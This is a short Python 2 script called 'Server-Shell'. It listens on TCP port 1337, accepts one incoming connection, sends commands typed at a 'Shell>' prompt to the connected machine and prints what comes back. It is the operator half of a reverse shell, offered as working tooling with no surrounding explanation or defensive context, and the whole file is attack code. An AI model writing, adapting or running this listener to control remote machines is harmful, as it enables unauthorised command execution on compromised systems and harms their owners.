#!/usr/bin/python
# Server-Shell
# Author: N4N0-GH05TL1N3 && H2O
import socket #import socket


def connect() : #define connect func
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #Create TCP socket
	sock.bind(('0.0.0.0', 1337)) #bind IP and Port
	sock.listen(1) #listen socket
	conn, addr = sock.accept() #accept connection

	print "[+] We got a connection from : ", addr #print message

	while True : 

		command = raw_input("Shell> ") #command prompt

		if 'terminate' in command : #keyword for kill connection
			conn.send('terminate')
			conn.close()
			break
		else :
			conn.send(command) #send command 
			print conn.recv(1024) #recv command

def main() : #define main func
	connect() #put connect func in main 

main() # use main
